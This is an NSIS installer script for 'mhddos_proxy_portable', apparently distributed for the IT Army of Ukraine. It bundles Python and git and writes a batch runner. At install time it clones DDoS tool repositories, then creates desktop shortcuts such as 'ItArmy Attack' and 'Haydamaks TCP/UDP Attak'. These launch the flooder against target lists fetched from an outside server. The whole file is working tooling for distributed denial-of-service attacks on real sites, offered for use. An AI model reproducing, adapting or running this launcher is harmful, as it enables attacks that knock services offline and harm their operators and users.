;--------------------------------
;Include Modern UI

  !include "MUI2.nsh"
  !include "x64.nsh"
  !include "LogicLib.nsh"
  !include "FileFunc.nsh"
  !include "WinVer.nsh"

;--------------------------------
;General

  ;Properly display all languages
  Unicode true
  
  SetCompressor /SOLID lzma
  SetCompressorDictSize 64
  SetDatablockOptimize ON

  ;Define name of the product
  !define PRODUCT "mhddos_proxy_portable"
  !define PRODUCT_VERSION "1.0.4"
  !define UNINSTALLER_NAME "uninstall"
  
  !define MHDDOS_PROXY_SRC "https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git"
  
  !define MHDDOS_PROXY_BETA_SRC "https://github.com/0xffiber/mhddos_proxy.git"
  
  !define MHDDOS_PROXY_DIR "$INSTDIR\mhddos_proxy"
  
  !define MHDDOS_PROXY_BETA_DIR "$INSTDIR\mhddos_proxy_beta"
  
  !define PYTHON_DIR "$INSTDIR\python"
  
  !define GIT_DIR "$INSTDIR\git"
  
  !define VCREDIST_DIR "$INSTDIR\vc_redist"
  
  !define haydamaks_tcp_target "-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt"
  !define haydamaks_udp_target "-c http://goals.ddosukraine.com.ua/haydamaky/targets_udp.txt"
  
  !define proxy_finder_src "https://github.com/porthole-ascend-cinnamon/proxy_finder.git"
  !define proxy_finder_dir "$INSTDIR\proxy_finder"



  ;Installer Version Information
  VIAddVersionKey "ProductName" "${PRODUCT}"
  VIAddVersionKey "CompanyName" "IT ARMY of Ukraine"
  VIAddVersionKey "LegalCopyright" "Copyright ©2022 MHDDoS Proxy Portable"
  VIAddVersionKey "FileDescription" "MHDDoS Proxy Portable"
  VIAddVersionKey "FileVersion" "${PRODUCT_VERSION}"
  VIProductVersion "${PRODUCT_VERSION}.0"

  ;Define the main name of the installer
  Name "${PRODUCT}"

  ;Define the directory where the installer should be saved
  OutFile "output\${PRODUCT}.exe"



  # set to default here, override in .onInit if on 64bit
  InstallDir "$APPDATA\${PRODUCT}"

Function .onInit

FunctionEnd





  ;Request rights if you want to install the program to program files
  RequestExecutionLevel admin

  ;Properly display all languages
  Unicode true

  ;Show 'console' in installer and uninstaller
  ShowInstDetails "show"
  ShowUninstDetails "show"

  ;Get installation folder from registry if available
  InstallDirRegKey HKLM "Software\${PRODUCT}" ""


;--------------------------------
;Interface Settings

  ;Show warning if user wants to abort
  !define MUI_ABORTWARNING

  ;Show all languages, despite user's codepage
  !define MUI_LANGDLL_ALLLANGUAGES

  ;Use optional a custom icon:
  !define MUI_ICON "resources\itarmy.ico" # for the Installer
  !define MUI_UNICON "resources\icon_uninstaller.ico" # for the later created UnInstaller

  ;Use optional a custom picture for the 'Welcome' and 'Finish' page:
  !define MUI_HEADERIMAGE_RIGHT
  !define MUI_WELCOMEFINISHPAGE_BITMAP "resources\picture_installer.bmp"  # for the Installer
  !define MUI_UNWELCOMEFINISHPAGE_BITMAP "resources\picture_uninstaller.bmp"  # for the later created UnInstaller

  ;Optional no descripton for all components
  !define MUI_COMPONENTSPAGE_NODESC


;--------------------------------
;Pages

  ;For the installer
  !insertmacro MUI_PAGE_WELCOME # simply remove this and other pages if you don't want it
  !insertmacro MUI_PAGE_LICENSE "LICENSE" # link to an ANSI encoded license file
  !insertmacro MUI_PAGE_COMPONENTS # remove if you don't want to list components
  !insertmacro MUI_PAGE_DIRECTORY
  !insertmacro MUI_PAGE_INSTFILES
  
  ;!define MUI_FINISHPAGE_RUN "$INSTDIR\runner.bat"
  !insertmacro MUI_PAGE_FINISH

  ;For the uninstaller
  !insertmacro MUI_UNPAGE_WELCOME
  !insertmacro MUI_UNPAGE_CONFIRM
  !insertmacro MUI_UNPAGE_INSTFILES
  !insertmacro MUI_UNPAGE_FINISH


;--------------------------------
;Languages

  ;At start will be searched if the current system language is in this list,
  ;if not the first language in this list will be chosen as language
  !insertmacro MUI_LANGUAGE "English"
  !insertmacro MUI_LANGUAGE "Russian"
  !insertmacro MUI_LANGUAGE "Ukrainian"

;--------------------------------
;Installer Section

Section ;Visual C++ Redistributable 2015-2022
	SetOutPath ${VCREDIST_DIR}
	
	${If} ${IsWin7} ; patch for windows 7
		${If} ${RunningX64}
			File /r "requirements\vc_redist\vc_redist.x64.exe"
		${Else}
			File /r "requirements\vc_redist\vc_redist.x86.exe"
		${EndIf}

		${If} ${RunningX64}
			ExecWait 'vc_redist.x64.exe /q /norestart' $0
			DetailPrint "-- vc_redist.x64.exe runtime exit code = '$0'"
		${Else}
			ExecWait 'vc_redist.x86.exe /q /norestart' $0
			DetailPrint "-- vc_redist.x86.exe runtime exit code = '$0'"
		${EndIf}
	${EndIf}
SectionEnd

Section "mhddos_proxy"
  SectionIn RO # Just means if in component mode this is locked

  ;Set output path to the installation directory.
  SetOutPath $INSTDIR

  ;Store installation folder in registry
  WriteRegStr HKLM "Software\${PRODUCT}" "" $INSTDIR

  ;Registry information for add/remove programs
  
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayName" "${PRODUCT}"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "UninstallString" '"$INSTDIR\${UNINSTALLER_NAME}.exe"'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayIcon" '"$INSTDIR\itarmy.ico",0'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "MHDDoS Proxy Portable"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/mhddos_proxy_portable"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoModify" 1
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoRepair" 1
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
  ${GetSize} "$INSTDIR" "/S=0K" $0 $1 $2
  IntFmt $0 "0x%08X" $0
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "EstimatedSize" "$0"

  ;Create optional start menu shortcut for uninstaller and Main component
  CreateDirectory "$SMPROGRAMS\${PRODUCT}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\ItArmy Attack.lnk" "$INSTDIR\runer.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\ItArmy Attack BETA.lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\Uninstall ${PRODUCT}.lnk" "$INSTDIR\${UNINSTALLER_NAME}.exe" "" "$INSTDIR\${UNINSTALLER_NAME}.exe" 0

  ;Create uninstaller
  WriteUninstaller "${UNINSTALLER_NAME}.exe"

SectionEnd

Section "git (portable)"
  SectionIn RO
  SetOutPath ${GIT_DIR}

  File /r "requirements\git\*"
  

SectionEnd



Section "python (portable)"
	SectionIn RO
	SetOutPath ${PYTHON_DIR}
 
	${If} ${RunningX64}
		File /r "requirements\python\x64\*"
	${Else}
		File /r "requirements\python\x86\*"
	${EndIf}  

SectionEnd

Section ;RUNNER
  SetOutPath $INSTDIR
  
  FileOpen $9 runner.bat w
  FileWrite $9 "@ECHO off$\r$\n"
  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
  FileWrite $9 "CLS$\r$\n"
  FileWrite $9 "COLOR 0A$\r$\n"
  
  FileWrite $9 ":MAIN$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"
  FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto MHDDOS_PROXY)$\r$\n"
  FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto MHDDOS_PROXY_BETA)$\r$\n"
  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
  FileWrite $9 ":RUN_UNINSTALL$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-uninstall' goto UNINSTALL)$\r$\n"
  
  FileWrite $9 ":run_clone_proxy_finder$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
  FileWrite $9 ":run_proxy_finder$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-proxy_finder' goto proxy_finder)$\r$\n"
  
  FileWrite $9 ":run_haydamaks_tcp$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp' goto haydamaks_tcp)$\r$\n"
  FileWrite $9 ":run_haydamaks_udp$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp' goto haydamaks_udp)$\r$\n"
  FileWrite $9 ":run_haydamaks_tcp_beta$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp_beta' goto haydamaks_tcp_beta)$\r$\n"
  FileWrite $9 ":run_haydamaks_udp_beta$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp_beta' goto haydamaks_udp_beta)$\r$\n"
  
  FileWrite $9 ":MAIN_INFO$\r$\n"
  FileWrite $9 "ECHO.$\r$\n"
  FileWrite $9 "ECHO 1. Run ItArmy Attak$\r$\n"
  FileWrite $9 "ECHO 2. Run ItArmy Attak BETA$\r$\n"
  FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
  FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
  FileWrite $9 "if '%choice%'=='1' goto MHDDOS_PROXY$\r$\n"
  FileWrite $9 "if '%choice%'=='2' goto MHDDOS_PROXY_BETA$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "START /W git clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "START /W python -m pip install --upgrade setuptools$\r$\n"
  FileWrite $9 "START /W python -m pip install --upgrade pip$\r$\n"
  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "START /W git clone -b feature-async ${MHDDOS_PROXY_BETA_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":MHDDOS_PROXY$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak ItArmy Target$\r$\n"
  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":MHDDOS_PROXY_BETA$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak ItArmy Target BETA$\r$\n"
  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":UNINSTALL$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "START /W python -m pip uninstall --yes -r requirements.txt$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "START /W python -m pip uninstall --yes -r requirements.txt$\r$\n"
  
  FileWrite $9 ":clone_proxy_finder$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "START /W git clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":proxy_finder$\r$\n"
  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "ECHO Cheack Update proxy_finder$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Proxy Finder (ItArmy)$\r$\n"
  FileWrite $9 "python finder.py$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":haydamaks_tcp$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak Haydamaks TCP Target$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
 
  FileWrite $9 ":haydamaks_udp$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak Haydamaks UDP Target$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":haydamaks_tcp_beta$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak Haydamaks TCP Target BETA$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":haydamaks_udp_beta$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attak Haydamaks UDP Target BETA$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
  FileWrite $9 "goto END$\r$\n"

  FileWrite $9 ":END$\r$\n"
  FileWrite $9 "EXIT$\r$\n"
  FileClose $9

  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy"'

  File "resources\itarmy.ico"
  
  CreateShortCut "$DESKTOP\ItArmy Attack.lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
SectionEnd


Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
  SectionIn RO
  SetOutPath $INSTDIR
 
  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
  
  File "resources\itarmy_beta.ico"
  
  CreateShortCut "$DESKTOP\ItArmy Attack BETA.lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0

SectionEnd

;Proxy Finder
Section	"Proxy Finder (Help to find proxies for ItArmy of Ukraine)"

  SetOutPath $INSTDIR
  
  File "resources\itarmy_proxy.ico"
  
  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_proxy_finder"'
  
  CreateShortCut "$DESKTOP\Proxy Finder (ItArmy of Ukraine).lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0

SectionEnd

;Haydamaks
Section	"Haydamaks Attak"

  SetOutPath $INSTDIR
  
  File "resources\haydamaks.ico"
  File "resources\haydamaks_beta.ico"
  
  CreateShortCut "$DESKTOP\Haydamaks TCP Attak.lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp" "$INSTDIR\haydamaks.ico" 0
  CreateShortCut "$DESKTOP\Haydamaks UDP Attak.lnk" "$INSTDIR\runner.bat" "-haydamaks_udp" "$INSTDIR\haydamaks.ico" 0
  
  CreateShortCut "$DESKTOP\Haydamaks TCP Attak BETA.lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp_beta" "$INSTDIR\haydamaks_beta.ico" 0
  CreateShortCut "$DESKTOP\Haydamaks UDP Attak BETA.lnk" "$INSTDIR\runner.bat" "-haydamaks_udp_beta" "$INSTDIR\haydamaks_beta.ico" 0

SectionEnd


;Uninstaller Section

Section "Uninstall"

  nsExec::ExecToStack  'cmd /c "$INSTDIR\runner.bat -uninstall"'
  
  ;Remove all registry keys
  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}"
  DeleteRegKey HKLM "Software\${PRODUCT}"

  ;Delete the installation directory + all files in it
  ;Add 'RMDir /r "$INSTDIR\folder\*.*"' for every folder you have added additionaly
  RMDir /r "$INSTDIR\*.*"
  RMDir "$INSTDIR"

  ;Delete Start Menu Shortcuts
  Delete "$SMPROGRAMS\${PRODUCT}\*.*"
  RmDir  "$SMPROGRAMS\${PRODUCT}"

  Delete "$DESKTOP\ItArmy Attack.lnk"
  Delete "$DESKTOP\ItArmy Attack BETA.lnk"
  
  Delete "$DESKTOP\Proxy Finder (ItArmy of Ukraine).lnk"
  
  Delete "$DESKTOP\Haydamaks TCP Attak.lnk"
  Delete "$DESKTOP\Haydamaks UDP Attak.lnk"
  Delete "$DESKTOP\Haydamaks TCP Attak BETA.lnk"
  Delete "$DESKTOP\Haydamaks UDP Attak BETA.lnk"


SectionEnd


;--------------------------------
;After Installation Function

Function .onInstSuccess

  ;Open 'Thank you for installing' site or something else
  ;ExecShell "open" "microsoft-edge:${AFTER_INSTALLATION_URL}"
  ExecShell "opennew" "https://t.me/itarmyofukraine2022"

FunctionEnd